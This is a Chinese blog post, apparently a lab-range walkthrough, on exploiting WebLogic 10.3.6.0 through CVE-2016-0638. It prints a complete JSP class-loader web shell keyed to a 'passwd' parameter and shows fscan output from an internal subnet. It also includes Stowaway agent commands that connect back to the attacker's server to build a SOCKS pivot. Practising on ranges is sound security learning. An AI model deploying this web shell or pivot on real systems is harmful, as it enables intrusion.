@@ -1,0 +1,224 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>记一次weblogic-10.3.6.0靶场漏洞利用 | root@wanth3f1ag</title><meta name="author" content="wanTh3flag"><meta name="copyright" content="wanTh3flag"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01前言一开始工具跑不起来，后面才发现是原先的java版本太高了，整了个java8才跑起来 0x02复现准备工具：WeblogicTool 1.2 环境靶场：http:&#x2F;&#x2F;119.45.164.136:7001&#x2F; dirsearch扫不出目录，但是看着cve的话就直接访问管理控制台了 外网探测http:&#x2F;&#x2F;119.45.164.136:7001&#x2F;console&#x2F;login&#x2F;LoginForm.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次weblogic-10.3.6.0靶场漏洞利用">
+<meta property="og:url" content="http://example.com/2025/03/23/weblogic%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前言一开始工具跑不起来，后面才发现是原先的java版本太高了，整了个java8才跑起来 0x02复现准备工具：WeblogicTool 1.2 环境靶场：http:&#x2F;&#x2F;119.45.164.136:7001&#x2F; dirsearch扫不出目录，但是看着cve的话就直接访问管理控制台了 外网探测http:&#x2F;&#x2F;119.45.164.136:7001&#x2F;console&#x2F;login&#x2F;LoginForm.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/3.jpg">
+<meta property="article:published_time" content="2025-03-23T11:17:18.000Z">
+<meta property="article:modified_time" content="2025-03-23T12:18:35.222Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/3.jpg"><link rel="shortcut icon" href="/image/avatar.jpg"><link rel="canonical" href="http://example.com/2025/03/23/weblogic%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '记一次weblogic-10.3.6.0靶场漏洞利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-23 20:18:35',
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/image/8.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/3.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">root@wanth3f1ag</span></a><a class="nav-page-title" href="/"><span class="site-name">记一次weblogic-10.3.6.0靶场漏洞利用</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">记一次weblogic-10.3.6.0靶场漏洞利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-23T11:17:18.000Z" title="发表于 2025-03-23 19:17:18">2025-03-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-23T12:18:35.222Z" title="更新于 2025-03-23 20:18:35">2025-03-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE/">CVE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>一开始工具跑不起来，后面才发现是原先的java版本太高了，整了个java8才跑起来</p>
+<h1 id="0x02复现"><a href="#0x02复现" class="headerlink" title="0x02复现"></a>0x02复现</h1><p>准备工具：WeblogicTool 1.2</p>
+<p>环境靶场：<a target="_blank" rel="noopener" href="http://119.45.164.136:7001/">http://119.45.164.136:7001/</a></p>
+<p>dirsearch扫不出目录，但是看着cve的话就直接访问管理控制台了</p>
+<h2 id="外网探测"><a href="#外网探测" class="headerlink" title="外网探测"></a>外网探测</h2><p><a target="_blank" rel="noopener" href="http://119.45.164.136:7001/console/login/LoginForm.jsp">http://119.45.164.136:7001/console/login/LoginForm.jsp</a></p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250323192049180.png" alt="image-20250323192049180"></p>
+<p>利用工具进行扫描</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250323192129192.png" alt="image-20250323192129192"></p>
+<p>CVE_2016_0638_ECHO漏洞，老漏洞了</p>
+<p>删掉端口后面多余字符，输入&#x2F;uddiexplorer&#x2F;</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250323192228090.png" alt="image-20250323192228090"></p>
+<p>随便在右上角找了一个图片的路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.45.164.136:7001/uddiexplorer/help.gif</span><br></pre></td></tr></table></figure>
+
+<p>复制图片文件名 到weblogic中用命令去查找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name help.gif</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250323192347356.png" alt="image-20250323192347356"></p>
+<p>然后我们pwd看一下当前的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/Oracle/Middleware/user_projects/domains/base_domain</span><br></pre></td></tr></table></figure>
+
+<p>然后拼接一下路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/</span><br></pre></td></tr></table></figure>
+
+<p>这个路径就是我们可以上传文件的路径</p>
+<p>因为是java的环境，所以我们需要写jsp的木马</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后密码是passwd</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用蚁剑连，然后用插件进行提权，这里队友做过了我就不做了</p>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>ifconfig看ip</p>
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250323193436352.png" alt="image-20250323193436352"></p>
+<p>在tmp目录里上传个fscan，给777权限然后扫内网ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.16.10.0/24</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#Halo AntSword!172.16.10.1:6379 open</span><br><span class="line">172.16.10.1:80 open</span><br><span class="line">172.16.10.1:22 open</span><br><span class="line">172.16.10.1:8082 open</span><br><span class="line">172.16.10.1:8848 open</span><br><span class="line">172.16.10.1:7001 open</span><br><span class="line">172.16.10.1:8081 open</span><br><span class="line">172.16.10.8:7001 open</span><br><span class="line">[*] WebTitle http://172.16.10.1        code:200 len:1925   title:Hello!</span><br><span class="line">[*] WebTitle http://172.16.10.1:8081   code:200 len:11215  title:Apache Tomcat/11.0.5</span><br><span class="line">[*] WebTitle http://172.16.10.1:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="line">[*] WebTitle http://172.16.10.1:8082   code:200 len:15928  title:BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站�</span><br><span class="line">[+] PocScan http://172.16.10.1:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[+] PocScan http://172.16.10.1:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="line">[+] Redis 172.16.10.1:6379 unauthorized file:/data/module.so</span><br><span class="line">[*] WebTitle http://172.16.10.1:7001   code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[*] WebTitle http://172.16.10.8:7001   code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan http://172.16.10.8:7001   [weblogic] </span><br><span class="line">[+] InfoScan http://172.16.10.1:7001   [weblogic] </span><br><span class="line">[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2020-14750 </span><br><span class="line">[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2020-14750 </span><br><span class="line">[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2019-2729-1 </span><br><span class="line">[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-ssrf </span><br><span class="line">[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-ssrf </span><br><span class="line">[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2019-2729-1 </span><br><span class="line">[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2019-2729-2 </span><br><span class="line">[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2019-2729-2 </span><br><span class="line">[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2019-2725 v10</span><br><span class="line">[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2019-2725 v10</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是搭建代理了，上传一个stowaway的agent</p>
+<p>给权限然后搭建代理</p>
+<p>攻击机(我的服务器)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 9999</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c IP:9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/CVE%E5%A4%8D%E7%8E%B0/image-20250323195405877.png" alt="image-20250323195405877"></p>
+<p>然后输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 5555</span><br></pre></td></tr></table></figure>
+
+<p>然后在浏览器中配置代理就行</p>
+<p>访问<a href="http://172.16.10.1:8082，BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站">http://172.16.10.1:8082，BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站</a></p>
+<p>发现这个隧道搭建的特别不稳定。。。做不了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">wanTh3flag</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/23/weblogic%E5%A4%8D%E7%8E%B0/">http://example.com/2025/03/23/weblogic%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">root@wanth3f1ag</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post-share"><div class="social-share" data-image="/image/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/23/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/" title="ctfshow月饼杯"><img class="cover" src="/image/9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ctfshow月饼杯</div></div><div class="info-2"><div class="info-item-1">web1_此夜圆一江春水何年尽，万古清光此夜圆 #反序列化字符串逃逸有附件，下下来看看 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);class a&#123;	public $uname;	public $password;	public function __construct($uname,$password)	&#123;		$this-&gt;uname=$uname;		$this-&gt;password=$password;	&#125;	public function __wakeup()	&#123;			if($this-&gt;password===&#x27;yu22x&#x27;)			&#123;				include(&#x27;flag.php&#x27;);				echo $flag;				&#125;			else			&#123;				echo &#x27;wrong...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/04/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0CVE-2024-53677/" title="Apache-Struts2-文件上传导致命令执行漏洞复现CVE-2024-53677"><img class="cover" src="/image/3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-04</div><div class="info-item-2">Apache-Struts2-文件上传导致命令执行漏洞复现CVE-2024-53677</div></div><div class="info-2"><div class="info-item-1">0x01前言之前好久就说想学着搭建靶场了但是一直没实操，这段时间刚考完试闲下来抓紧把任务做了 0x02漏洞信息官方文档里就有对漏洞的介绍 Apache Struts2是什么Apache Struts2是一个基于Java技术的开源Web应用框架，用于开发Java Web应用程序。Apache Struts2框架提供了一套标准的MVC（Model-View-Controller）架构，帮助开发者更好地组织和管理Web应用程序的代码。通过Struts2，开发者可以将应用程序的业务逻辑、用户界面和数据模型相互分离，使代码更易于维护和扩展。 CVE-2024-53677CVE-2024-53677是一个在Apache Struts 框架中发现的严重漏洞，Apache Struts 中的文件上传逻辑存在缺陷。攻击者可以操纵文件上传参数以启用路径遍历，在某些情况下，这可能导致上传可用于执行远程代码执行的恶意文件。 影响版本Struts 2.0.0至Struts 2.3.37（EOL）  Struts 2.5.0至Struts 2.5.33（EOL） Struts 6.0.0到Struts...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">wanTh3flag</div><div class="author-info-description">web低手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">只会做签到题，签完到就走</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E5%A4%8D%E7%8E%B0"><span class="toc-text">0x02复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-text">外网探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-text">内网穿透</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/23/weblogic%E5%A4%8D%E7%8E%B0/" title="记一次weblogic-10.3.6.0靶场漏洞利用"><img src="/image/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次weblogic-10.3.6.0靶场漏洞利用"/></a><div class="content"><a class="title" href="/2025/03/23/weblogic%E5%A4%8D%E7%8E%B0/" title="记一次weblogic-10.3.6.0靶场漏洞利用">记一次weblogic-10.3.6.0靶场漏洞利用</a><time datetime="2025-03-23T11:17:18.000Z" title="发表于 2025-03-23 19:17:18">2025-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/23/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/" title="ctfshow月饼杯"><img src="/image/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow月饼杯"/></a><div class="content"><a class="title" href="/2025/03/23/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/" title="ctfshow月饼杯">ctfshow月饼杯</a><time datetime="2025-03-23T07:36:48.000Z" title="发表于 2025-03-23 15:36:48">2025-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/23/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" title="ctfshow内部赛"><img src="/image/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow内部赛"/></a><div class="content"><a class="title" href="/2025/03/23/ctfshow%E5%86%85%E9%83%A8%E8%B5%9B/" title="ctfshow内部赛">ctfshow内部赛</a><time datetime="2025-03-23T07:36:15.000Z" title="发表于 2025-03-23 15:36:15">2025-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/20/java%E4%BB%8E0%E5%88%B01%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="java从0到1的学习"><img src="/image/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java从0到1的学习"/></a><div class="content"><a class="title" href="/2025/03/20/java%E4%BB%8E0%E5%88%B01%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="java从0到1的学习">java从0到1的学习</a><time datetime="2025-03-20T11:55:35.000Z" title="发表于 2025-03-20 19:55:35">2025-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" 